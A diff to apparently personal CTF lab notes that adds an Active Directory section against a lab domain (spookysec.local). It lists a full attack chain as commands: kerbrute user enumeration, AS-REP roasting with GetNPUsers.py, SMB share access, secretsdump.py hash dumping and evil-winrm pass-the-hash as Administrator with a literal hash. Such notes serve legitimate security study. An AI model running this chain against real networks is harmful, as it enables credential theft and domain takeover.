@@ -201,3 +201,36 @@ scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
 ## decode/encode
 
 https://gchq.github.io/CyberChef/
+
+## Active Directory
+
+enumerate users - requires wordlist
+
+```
+./kerbrute userenum --dc 10.10.4.164 -d spookysec.local /home/kali/Downloads/userlist.txt 
+```
+
+Which user account can you query a ticket from with no password?
+```
+GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.4.164
+```
+
+enum shares - requires password
+```
+smbclient -L 10.10.4.164 --user svc-admin
+```
+
+connect to share - requires password
+```
+smbclient //10.10.4.164/backup --user svc-admin
+```
+
+dump all hashes - requires password
+```
+secretsdump.py backup@10.10.4.164 -just-dc
+```
+
+pass the hash 
+```
+evil-winrm -i 10.10.4.164 -u Administrator -H e4876a80a723612986d7609aa5ebc12b
+```
